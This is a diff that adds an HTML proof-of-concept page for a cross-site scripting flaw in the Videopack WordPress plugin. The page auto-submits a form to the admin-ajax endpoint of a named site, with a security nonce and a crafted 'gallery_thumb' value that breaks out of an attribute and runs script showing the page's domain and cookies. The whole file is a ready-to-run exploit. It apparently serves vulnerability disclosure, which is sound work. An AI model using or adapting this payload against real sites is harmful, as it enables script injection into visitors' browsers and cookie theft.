@@ -1,0 +1,22 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Videopack XSS domain and cookie alerts</title>
+<form id="poc" method="post" enctype="multipart/form-data"
+      action="https://videorulebook.nba.com/wp-admin/admin-ajax.php">
+  <input name="action" value="kgvid_switch_gallery_page">
+  <input name="security" value="8df5c8250d">
+  <input name="page" value="1">
+  <input name="last_video_id" value="0">
+  <input name="query_atts[gallery_orderby]" value="menu_order">
+  <input name="query_atts[gallery_order]" value="ASC">
+  <input name="query_atts[gallery_per_page]" value="1">
+  <input name="query_atts[gallery_id]" value="0">
+  <input name="query_atts[gallery_exclude]" value="">
+  <input name="query_atts[gallery_include]" value="3427">
+  <input name="query_atts[gallery_thumb]" value='250"><details open ontoggle="alert(document.domain);alert(document.cookie)">' >
+  <input name="query_atts[caption]" value="">
+  <input name="query_atts[skin]" value="">
+  <input name="query_atts[gallery_end]" value="close">
+  <input name="query_atts[gallery_title]" value="false">
+</form>
+<script>document.getElementById('poc').submit();</script>
